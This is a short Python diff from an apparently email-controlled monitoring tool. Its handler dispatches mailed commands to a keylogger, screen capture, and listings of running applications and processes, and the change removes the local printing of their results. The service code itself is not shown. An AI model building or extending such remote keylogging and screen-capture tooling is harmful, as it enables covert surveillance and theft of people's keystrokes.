@@ -18,23 +18,13 @@ def handle(myAr):
     print("Handling Mail")
     for task in myAr:
         if task == "[key_logger]":
-            res = service.keylogger()
-            resString = ""
-            for keyword in res:
-                resString = resString + keyword
-            print(resString)
+            service.keylogger()
         if task == "[screen_capture]":
             service.screenshot()
         if task == "[list_app]":
-            res = service.listRunningApplication()
-            for app in res:
-                if app != "Description" and app != "-----------":
-                    print(app)
+            service.listRunningApplication()
         if task == "[list_processes]":
-            res = service.listRunningProcess()
-            sorted_processes = sorted(res, key=lambda process: process["Name"])
-            for process in sorted_processes:
-                print(process)
+            service.listRunningProcess()
 
 
 # def testoutput():
